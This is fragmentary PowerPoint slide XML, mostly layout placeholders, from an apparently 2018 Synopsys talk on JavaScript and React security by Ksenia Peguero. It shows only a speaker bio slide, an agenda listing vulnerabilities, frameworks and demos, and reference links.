            <a:ext cx="5384800" cy="4846320"/>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custDataLst>
              <p:tags r:id="rId5"/>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2879738667"/>
      </p:ext>
    </p:extLst>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5">
          <p15:clr>
            <a:srgbClr val="5ACBF0"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="5" orient="horz" pos="52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alf Gray">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dirty="0"/>
              <a:t>Click to Add a Title</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text Placeholder 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" sz="quarter" idx="12" hasCustomPrompt="1"/>
            <p:custDataLst>
              <p:tags r:id="rId2"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="838200"/>
            <a:ext cx="11582400" cy="457200"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr marL="0" indent="0">
              <a:buNone/>
              <a:defRPr sz="2000" i="1"/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Click to Add a Subtitle</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Rectangle 6"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:custDataLst>
              <p:tags r:id="rId3"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="ltGray">
          <a:xfrm>
            <a:off x="0" y="3959188"/>
            <a:ext cx="12192000" cy="24416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Content Placeholder 7"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="quarter" idx="13" hasCustomPrompt="1"/>
            <p:custDataLst>
              <p:tags r:id="rId4"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609599" y="1417320"/>
            <a:ext cx="10972800" cy="4846320"/>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p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4068654852"/>
      </p:ext>
    </p:extLst>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
  <p:extLst mod="1">
    <p:ext uri="{DCECCB84-F9BA-43D5-87BE-67443E8EF086}">
      <p15:sldGuideLst xmlns:p15="http://schemas.microsoft.com/office/powerpoint/2012/main">
        <p15:guide id="1" orient="horz" pos="528">
          <p15:clr>
            <a:srgbClr val="5ACBF0"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="2" orient="horz" pos="888">
          <p15:clr>
            <a:srgbClr val="5ACBF0"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="3" orient="horz" pos="3948">
          <p15:clr>
            <a:srgbClr val="5ACBF0"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="4" pos="384">
          <p15:clr>
            <a:srgbClr val="5ACBF0"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="5" pos="729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Gray Bar_1">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3197523" y="0"/>
            <a:ext cx="8994476" cy="6400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3519488" y="57150"/>
            <a:ext cx="8672511" cy="1143000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr algn="l">
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Click to Add a Title</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Content Placeholder 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="quarter" idx="10" hasCustomPrompt="1"/>
            <p:custDataLst>
              <p:tags r:id="rId3"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="322054" y="370937"/>
            <a:ext cx="2587924" cy="5877463"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr marL="0" indent="0">
              <a:buFontTx/>
              <a:buNone/>
              <a:defRPr sz="2000"/>
            </a:lvl1pPr>
            <a:lvl2pPr>
              <a:buFontTx/>
              <a:buNone/>
              <a:defRPr/>
            </a:lvl2pPr>
            <a:lvl3pPr>
              <a:buFontTx/>
              <a:buNone/>
              <a:defRPr/>
            </a:lvl3pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Click to add text or choose an icon below to insert other content</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Content Placeholder 7"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="quarter" idx="11" hasCustomPrompt="1"/>
            <p:custDataLst>
              <p:tags r:id="rId4"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3519578" y="1414463"/>
            <a:ext cx="8367623" cy="4846320"/>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p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text Placeholder 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" sz="quarter" idx="12" hasCustomPrompt="1"/>
            <p:custDataLst>
              <p:tags r:id="rId5"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3519488" y="838200"/>
            <a:ext cx="8672511"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4169017165"/>
      </p:ext>
    </p:extLst>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
  <p:extLst mod="1">
    <p:ext uri="{DCECCB84-F9BA-43D5-87BE-67443E8EF086}">
      <p15:sldGuideLst xmlns:p15="http://schemas.microsoft.com/office/powerpoint/2012/main">
        <p15:guide id="1" pos="2217">
          <p15:clr>
            <a:srgbClr val="5ACBF0"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="2" pos="7488">
          <p15:clr>
            <a:srgbClr val="5ACBF0"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="3" orient="horz" pos="528">
          <p15:clr>
            <a:srgbClr val="5ACBF0"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="4" orient="horz" pos="888">
          <p15:clr>
            <a:srgbClr val="5ACBF0"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="5" orient="horz" pos="3945">
          <p15:clr>
            <a:srgbClr val="5ACBF0"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="6" orient="horz" pos="233">
          <p15:clr>
            <a:srgbClr val="5ACBF0"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="7" pos="203">
          <p15:clr>
            <a:srgbClr val="5ACBF0"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="8" pos="183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Gray Bar_2">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8534400" y="0"/>
            <a:ext cx="3657600" cy="6400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609600" y="65776"/>
            <a:ext cx="7620000" cy="1143000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr algn="l">
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Click to Add a Title</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Content Placeholder 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="quarter" idx="10" hasCustomPrompt="1"/>
            <p:custDataLst>
              <p:tags r:id="rId3"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="1414462"/>
            <a:ext cx="7620000" cy="4846637"/>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p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Content Placeholder 7"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="quarter" idx="11" hasCustomPrompt="1"/>
            <p:custDataLst>
              <p:tags r:id="rId4"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8737600" y="228600"/>
            <a:ext cx="3251200" cy="6019800"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr marL="0" indent="0">
              <a:buNone/>
              <a:defRPr sz="2000"/>
            </a:lvl1pPr>
            <a:lvl2pPr marL="0" indent="0">
              <a:buNone/>
              <a:defRPr/>
            </a:lvl2pPr>
            <a:lvl3pPr marL="0" indent="0">
              <a:buNone/>
              <a:defRPr/>
            </a:lvl3pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Click to add text or choose an icon below to insert other content</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text Placeholder 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" sz="quarter" idx="12" hasCustomPrompt="1"/>
            <p:custDataLst>
              <p:tags r:id="rId5"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609601" y="838200"/>
            <a:ext cx="7625751"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4155250500"/>
      </p:ext>
    </p:extLst>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
  <p:extLst mod="1">
    <p:ext uri="{DCECCB84-F9BA-43D5-87BE-67443E8EF086}">
      <p15:sldGuideLst xmlns:p15="http://schemas.microsoft.com/office/powerpoint/2012/main">
        <p15:guide id="1" pos="384">
          <p15:clr>
            <a:srgbClr val="5ACBF0"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="2" pos="5184">
          <p15:clr>
            <a:srgbClr val="5ACBF0"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="3" orient="horz" pos="3944">
          <p15:clr>
            <a:srgbClr val="5ACBF0"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="4" orient="horz" pos="888">
          <p15:clr>
            <a:srgbClr val="5ACBF0"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="5" orient="horz" pos="528">
          <p15:clr>
            <a:srgbClr val="5ACBF0"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="6" orient="horz" pos="144">
          <p15:clr>
            <a:srgbClr val="5ACBF0"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="7" pos="5503">
          <p15:clr>
            <a:srgbClr val="5ACBF0"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="8" pos="756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Left Gray Bar">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0" y="0"/>
            <a:ext cx="4145280" cy="6400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4449234" y="65776"/>
            <a:ext cx="7742767" cy="1143000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr algn="l">
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Click to Add a Title</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Content Placeholder 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="quarter" idx="10" hasCustomPrompt="1"/>
            <p:custDataLst>
              <p:tags r:id="rId3"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4449233" y="1414463"/>
            <a:ext cx="7437120" cy="4846637"/>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p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Content Placeholder 7"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="quarter" idx="11" hasCustomPrompt="1"/>
            <p:custDataLst>
              <p:tags r:id="rId4"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="274320" y="228600"/>
            <a:ext cx="3596640" cy="6019800"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr marL="233363" indent="-233363">
              <a:buFont typeface="Arial" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
              <a:defRPr sz="2000"/>
            </a:lvl1pPr>
            <a:lvl2pPr marL="457200" indent="-227013">
              <a:buFont typeface="Arial" pitchFamily="34" charset="0"/>
              <a:buChar char="–"/>
              <a:defRPr sz="1800" baseline="0"/>
            </a:lvl2pPr>
            <a:lvl3pPr marL="690563" indent="-236538">
              <a:buFont typeface="Arial" pitchFamily="34" charset="0"/>
              <a:buChar char="–"/>
              <a:tabLst>
                <a:tab pos="690563" algn="l"/>
              </a:tabLst>
              <a:defRPr sz="1600" baseline="0"/>
            </a:lvl3pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Click to add text or choose an icon below to insert other content</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Second level</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Third level</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text Placeholder 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" sz="quarter" idx="12" hasCustomPrompt="1"/>
            <p:custDataLst>
              <p:tags r:id="rId5"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4449234" y="838200"/>
            <a:ext cx="7742767" cy="457200"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr marL="0" indent="0">
              <a:buNone/>
              <a:defRPr sz="2000" i="1"/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Click to Add a Subtitle</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2674761521"/>
      </p:ext>
    </p:extLst>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
  <p:extLst mod="1">
    <p:ext uri="{DCECCB84-F9BA-43D5-87BE-67443E8EF086}">
      <p15:sldGuideLst xmlns:p15="http://schemas.microsoft.com/office/powerpoint/2012/main">
        <p15:guide id="1" orient="horz" pos="528">
          <p15:clr>
            <a:srgbClr val="5ACBF0"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="2" orient="horz" pos="888">
          <p15:clr>
            <a:srgbClr val="5ACBF0"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="3" orient="horz" pos="3944">
          <p15:clr>
            <a:srgbClr val="5ACBF0"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="4" pos="173">
          <p15:clr>
            <a:srgbClr val="5ACBF0"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="5" pos="2441">
          <p15:clr>
            <a:srgbClr val="5ACBF0"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="6" pos="7488">
          <p15:clr>
            <a:srgbClr val="5ACBF0"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="7" pos="280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77BCB2-9D0A-499A-B2BE-A59EFA404956}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr>
            <p:custDataLst>
              <p:tags r:id="rId1"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId5"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="12192000" cy="6858000"/>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0233358" y="485435"/>
            <a:ext cx="1653211" cy="529027"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="TextBox 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:custDataLst>
              <p:tags r:id="rId3"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1360968" y="2558734"/>
            <a:ext cx="4363427" cy="923330"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="5400" b="1" dirty="0"/>
              <a:t>Thank You</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="11363731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6" name="Picture 5"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr>
            <p:custDataLst>
              <p:tags r:id="rId1"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3">
            <a:extLst>
              <a:ext uri="{28A0092B-C50C-407E-A947-70E740481C1C}">
                <a14:useLocalDpi xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main"/>
              </a:ext>
            </a:extLst>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4267351" y="2843832"/>
            <a:ext cx="3657298" cy="1170335"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="23402603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endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Vertical Text Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" orient="vert" idx="1"/>
            <p:custDataLst>
              <p:tags r:id="rId2"/>
            </p:custDataLst>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8094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9770300" y="365125"/>
            <a:ext cx="1813687" cy="58975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custDataLst>
              <p:tags r:id="rId2"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609601" y="365125"/>
            <a:ext cx="9022914" cy="589756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283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4.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1.xml"/><Relationship Id="rId28"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tags" Target="../tags/tag5.xml"/><Relationship Id="rId30"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3"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="68574"/>
            <a:ext cx="11581896"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custDataLst>
              <p:tags r:id="rId24"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="1414463"/>
            <a:ext cx="10972800" cy="484822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pic>
        <p:nvPicPr>
          <p:cNvPr id="7" name="Picture 6"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr>
            <p:custDataLst>
              <p:tags r:id="rId25"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId32"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="11101153" y="6542971"/>
            <a:ext cx="881902" cy="217536"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="TextBox 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:custDataLst>
              <p:tags r:id="rId26"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="163812" y="6516189"/>
            <a:ext cx="3759200" cy="230832"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="900" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>© 2018 Synopsys, Inc. </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="TextBox 8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:custDataLst>
              <p:tags r:id="rId27"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1157671" y="6516189"/>
            <a:ext cx="853440" cy="230832"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:fld id="{CAE2347F-76BC-4690-80B5-B24BA0EA7B0A}" type="slidenum">
              <a:rPr lang="en-US" sz="900" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:pPr algn="ctr"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" sz="900" dirty="0">
              <a:solidFill>
                <a:schemeClr val="tx1">
                  <a:lumMod val="50000"/>
                  <a:lumOff val="50000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="TaggedShape" hidden="1"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:custDataLst>
              <p:tags r:id="rId28"/>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4" name="TaggedShape" hidden="1"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:custDataLst>
              <p:tags r:id="rId2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5" name="TaggedShape" hidden="1"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:custDataLst>
              <p:tags r:id="rId30"/>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7049370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medium.com/front-end-hacking/server-side-rendering-with-react-and-express-382591bfc77c"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redux.js.org/docs/recipes/ServerRendering.ht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reactjs.org/docs/typechecking-with-proptypes.htm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s://github.com/yannickcr/eslint-plugin-react/"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mailto:ksenia@synopsys.com"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21.gif"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.synopsys.com/softw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to                      </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>to</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> JavaScript [In]Security</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Subtitle 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="subTitle" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="3329906"/>
            <a:ext cx="10963923" cy="917516"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Ksenia Peguero</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8537" y="2221166"/>
            <a:ext cx="2466681" cy="1152256"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2502744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whoami</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="1414463"/>
            <a:ext cx="6011333" cy="4848225"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>Sr. Research Lead at Synopsys</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>8 years in security</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>PhD candidate at GWU</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>@</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0" err="1"/>
              <a:t>KseniaDmitrieva</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>Mother</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>Ballroom dancer</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="2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624" y="1211574"/>
            <a:ext cx="2190750" cy="85725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9571" y="1211574"/>
            <a:ext cx="3217728" cy="4789176"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2981418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447798" y="2633664"/>
            <a:ext cx="8551333" cy="2124604"/>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State of JavaScript today</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Common JavaScript vulnerabilities</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Frameworks</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>React vulnerabilities and security-related quirks</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Demos</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
